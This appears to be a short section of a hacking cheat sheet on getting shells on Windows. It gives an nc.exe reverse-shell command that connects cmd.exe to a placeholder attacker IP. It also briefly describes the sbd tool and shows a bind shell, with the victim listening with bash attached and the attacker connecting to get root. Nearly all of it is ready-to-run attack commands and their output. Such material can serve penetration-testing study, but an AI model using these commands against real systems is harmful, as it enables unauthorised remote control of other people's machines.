# Windows

## NC

```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```

## SBD

[**sbd**](https://www.kali.org/tools/sbd/) **is a portable and secure Netcat alternative**. It works on Unix-like systems and Win32. With features like strong encryption, program execution, customizable source ports, and continuous reconnection, sbd provides a versatile solution for TCP/IP communication. For Windows users, the sbd.exe version from the Kali Linux distribution can be used as a reliable replacement for Netcat.

```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
